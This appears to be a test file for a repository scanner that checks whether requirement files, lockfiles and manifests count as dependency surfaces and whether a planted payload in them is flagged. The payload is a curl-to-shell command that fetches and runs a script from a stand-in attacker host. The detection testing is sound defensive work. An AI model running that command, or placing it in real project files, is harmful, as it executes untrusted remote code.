import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a requirement file in a requirements directory is a dependency surface", () => {
  // PRD section 8: the scan checks the dependencies of the checked revision.
  // `requirements.txt` is covered, but the common `requirements/base.txt`
  // layout is not: the same content in a different directory is dropped.
  for (const path of [
    "requirements/base.txt",
    "requirements/prod.txt",
    "backend/requirements/common.txt",
  ]) {
    const inspection = inspected(path, PAYLOAD);
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["dependencies", "source"],
    });
    expect({ path, coverage: inspection.coverage.dependencies }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
  }
});

test("the lockfile or manifest of a recognized ecosystem is a dependency surface", () => {
  for (const [path, surface] of [
    ["pdm.lock", "dependencies"],
    ["pubspec.lock", "dependencies"],
    ["mix.lock", "dependencies"],
    ["Podfile.lock", "dependencies"],
    ["packages.lock.json", "dependencies"],
    ["gradle.lockfile", "dependencies"],
    ["conda-lock.yml", "dependencies"],
    ["mix.exs", "manifests"],
    ["Podfile", "manifests"],
    ["conanfile.txt", "manifests"],
  ] as const) {
    expect(surfacesOf(path)).toContain(surface);
    const inspection = inspected(path, PAYLOAD);
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
  }
});

test("a plain text file stays outside the dependency surfaces", () => {
  expect(surfacesOf("notes.txt")).toEqual([]);
  expect(surfacesOf("docs/guide.txt")).toEqual([]);
  expect(inspected("docs/guide.txt", PAYLOAD).findings).toEqual([]);
});
